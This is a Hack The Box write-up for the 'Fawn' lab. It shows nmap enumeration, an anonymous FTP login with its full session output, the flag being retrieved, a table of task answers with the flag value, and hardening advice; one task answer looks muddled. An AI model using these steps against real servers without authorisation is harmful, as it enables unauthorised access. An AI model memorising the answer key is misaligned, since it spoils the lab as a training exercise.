
```markdown
# 🎯 Hack The Box: Fawn Write-up

---

## 📌 Machine Overview

| Parameter | Value |
| :--- | :--- |
| **Machine Name** | Fawn |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Target IP** | *(Dynamic HTB IP)* |
| **Primary Service** | FTP |
| **Port** | `21/TCP` |
| **Vulnerability** | Anonymous FTP Login Allowed |
| **Root Flag** | `035844102705c01438cb702323ef7096` |

---

## 🔍 Step-by-Step Execution Log

### 1. Host Reachability Check

First, we verified network connectivity to the target machine using `ping`:

```bash
ping -c 4 <TARGET_IP>

```

### 2. Service Enumeration (`Nmap`)

We scanned open ports and service versions using `nmap`:

```bash
nmap -sV <TARGET_IP>

```

**Scan Output:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

```

### 3. Exploitation (Anonymous FTP Access)

The scan revealed FTP running on TCP port 21 with anonymous authentication enabled. We connected to the target using the FTP client:

```bash
ftp <TARGET_IP>

```

When prompted for a username, we entered `anonymous` and pressed **Enter** for the password (leaving it blank):

**Terminal Session:**

```text
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (<TARGET_IP>:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

### 4. Flag Retrieval

Once authenticated, we listed the remote directory, located `flag.txt`, and downloaded it to our local system using `get`:

```ftp
ftp> ls
227 Entering Passive Mode (...)
-rw-r--r--    1 0        0              33 Sep 08  2021 flag.txt

ftp> get flag.txt
226 Transfer complete.

ftp> exit

```

Back in our local terminal, we read the contents of the downloaded flag file:

```bash
cat flag.txt
035844102705c01438cb702323ef7096

```

---

## 🛠️ Command Cheatsheet

| Command | Environment | Purpose / Description |
| --- | --- | --- |
| `ping -c 4 <IP>` | Local Terminal | Sends 4 ICMP echo requests to confirm reachability |
| `nmap -sV <IP>` | Local Terminal | Detects open ports, services, and anonymous FTP scripts |
| `ftp <IP>` | Local Terminal | Initiates an interactive FTP session to the target host |
| `ls` | FTP Prompt | Lists files and directories on the remote FTP server |
| `get <filename>` | FTP Prompt | Downloads a specified file from the FTP server to your local machine |
| `exit` / `bye` | FTP Prompt | Closes the active FTP connection |
| `cat flag.txt` | Local Terminal | Displays the flag content saved locally |

---

## 📝 HTB Task Answers

| Task | Question | Answer |
| --- | --- | --- |
| **1** | What acronym is used for the VM network interface? | `VM` |
| **2** | What tool do we use to send ICMP echo requests? | `ping` |
| **3** | What tool is used for port scanning and service detection? | `nmap` |
| **4** | What service is running on TCP port 21? | `ftp` |
| **5** | What username can be used to log into FTP without a personal account? | `anonymous` |
| **6** | What response code indicates login success? | `230` |
| **7** | What command downloads a file from the FTP server? | `get` |
| **Flag** | Submit the flag located on the server | `035844102705c01438cb702323ef7096` |

---

## 💡 Core Takeaways & Remediation

1. **Anonymous Access Risk:** Enabling anonymous logins on FTP allows unauthorized users to read, upload, or modify files depending on permission settings.
2. **Cleartext Protocol:** Standard FTP transmits authentication and data in unencrypted cleartext over the wire.
3. **Remediation:** Disable anonymous access in `vsftpd.conf` (`anonymous_enable=NO`) and upgrade to secure alternatives like **SFTP (SSH File Transfer Protocol)** or **FTPS (FTP over TLS)**.

```

```
